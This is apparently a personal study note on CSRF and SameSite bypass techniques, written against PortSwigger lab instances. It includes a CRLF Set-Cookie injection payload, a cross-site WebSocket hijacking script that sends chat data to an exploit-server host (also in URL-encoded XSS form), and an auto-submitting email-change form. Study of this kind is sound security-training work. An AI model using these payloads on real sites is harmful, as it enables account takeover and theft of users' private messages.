# CSRF

## Testing

1) Change Request method from POST to GET and GET to POST (add `&_method=POST` if not worked for GET)
2) Remove the CSRF key and try if it is working
3) Swap the CSFR token with another valid token by other user
4) Check if the CSRF token is tied to the CSRF cookie
	1) Submit an invalid CSRF token
	2) Submit a valid CSRF token from another user
	3) Submit valid CSRF token and cookie from another user
5) Try to inject HTTP Header (Set-Cookie header)
6) Chain Directory Traversal (Post to GET) to CSRF [[#SameSite Strict bypass via client-side redirect]]
7) Chain subdomain XSS (to bypass same-site:strict) to ping the burp collaborator and send websocket data to the collab url. [[#SameSite Strict bypass via sibling domain]]
8) 


### No defenses

Generate POC directly with Auto Submit

### Token validation depends on request method

Change the Request Type form POST to GET or GET to POST  
Generate PoC and Exploit with Auto Submit

### Token validation depends on token being present

Remove the CSFR token and generate the PoC.  
The Request will be Accept

### Token is not tied to user session

Swap the CSFR token with another valid token by other user.
The request will be Accept.

### Token is tied to non-session cookie

There will be a another CSFR Key (in cookies - defense mechanism) : non-Session Cookie.  
Swap both the CSFR token and CSFR key from a valid account.  
Search for Set Cookie functionality to set the CSFR key from the POC. (We need to set our attacker owned account CSRF Key when we send the link to victim).
Use img tag onerror functionality, and Auto Submit.

### Double Submit Cookie

In this case the application uses Double submit cookie.  
  
where the server does not stores any CSRF cookie.  
  
Instead it uses double submit cookie that is there will be a csrf token along with the session id, and another csrf token in the functionality (csrf parameter sent along with the other parameter).  
  
the server checks the both the CSRF tokens if they match the server accepts.  
  
to exploit this we need to find a vuln parameter that allows to inject HTTP header injection and uses Set-cookie method and add our own (any) CSRF token .  
  
then our csrf token will be set in the HTTP header  
  
and use this and generate CSRF POC with burpsuite.  
  
(the CSRF POC with burpsuite already includes a hidden input of CSRF token and we already set a cookie through parameter. So both are match and request is validated)  
  
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None


### SameSite Lax bypass via method override

The HTML forms doesn't not support methods like PUT, PATCH etc.  
  
The frameworks like Laravel gives an option to override this.  
  
There is a hidden field in the form i.e. `_method` where it informs the framework to use the specified method rather than the HTTP form method (GET or POST).  
  
This is Called "Method Spoofing"  
  
In this lab there is no Samesite Cookies set. But the Chrome will default it lax.  
  
To exploit generate CSRF POC with burpsuite. Now change the HTTP method to GET and add `_method=POST` at the end of parameter of GET URL.
  
add the new line to the form  

### SameSite Strict bypass via client-side redirect

The cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests.

TO achieve this we need to make a request from the application itself for any functionality.

In this for comment adding there is a confirmation redirect is happening where the ID is directly placing in the JS code. So with this we can do directory traversal.

change the method from POST to GET (change email) copy the parameter and paste it in the confirmation redirect after directory traversal. 

Now Generate CSRF payload

### SameSite Strict bypass via sibling domain

The Subdomain has an XSS Vulnerability. 
In the main domain has a live chat feature with Web Sockets.

The live chat web sockets page is protected with same site strict. So cross origin requests doesn't include session cookie. 

So we are using the XSS from sub domain to make a request to our attacker hosted website with the web sockets previous chat history.

we will send the sub domain page with XSS to the victim. the XSS script will fetch all the chat data and sends to our exploit server. Since the request is comming from the sub domain. we bypassed the same site strict.

Cross-Site Websocket Hijacking Attack:

```
<script>
    var ws = new WebSocket('wss://0aa8004b03ea6683810111d900540004.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://exploit-0afe00f703036646819010e501280044.exploit-server.net/exploit?content=' + event.data)
    }
</script>
```

Cross-Site Websocket Hijacking Attack + XSS:

```
<script>
document.location = "https://cms-0aa8004b03ea6683810111d900540004.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%61%38%30%30%34%62%30%33%65%61%36%36%38%33%38%31%30%31%31%31%64%39%30%30%35%34%30%30%30%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%66%65%30%30%66%37%30%33%30%33%36%36%34%36%38%31%39%30%31%30%65%35%30%31%32%38%30%30%34%34%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%63%6f%6e%74%65%6e%74%3d%27%20%2b%20%65%76%65%6e%74%2e%64%61%74%61%29%0a%20%20%20%20%7d%0a%3c%2f%73%63%72%69%70%74%3e&password=fwefwefw";
</script>
```


### SameSite Lax bypass via cookie refresh


In this Lax is there. So we have 2 minutes in starting after session cookie was set.
We need to run our script in this two minute time frame.

But it is not possible. The application is using OAuth Social login. So we will craft our payload to send a request to the OAuth page that will initiate a new cookie, then now we have 2 times. we will execute our script after the OAuth completion. 

We will craft our payload to open the OAuth page via `window.open` (open redirect via XSS). But the pop ups are blocking. so we need to trigger onclick window to open the OAuth page and to execute the script.

```
<form method="POST" action="https://0a5000b904add9f780e5dfdc001a00b8.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0a5000b904add9f780e5dfdc001a00b8.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```




 